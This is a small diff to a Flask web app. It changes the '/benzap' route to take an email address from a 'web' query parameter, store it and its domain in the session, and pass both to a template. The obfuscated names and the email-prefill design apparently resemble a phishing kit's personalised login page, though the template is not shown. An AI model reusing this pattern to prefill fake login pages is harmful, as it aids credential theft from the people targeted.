@@ -281,9 +281,13 @@ def second():
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
+    web_param = request.args.get('web')
+    if web_param:
+        session['eman'] = web_param
+        session['ins'] = web_param[web_param.index('@') + 1:]
+
+    eman = session.get('eman')
+    dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/lasmop", methods=['GET'])
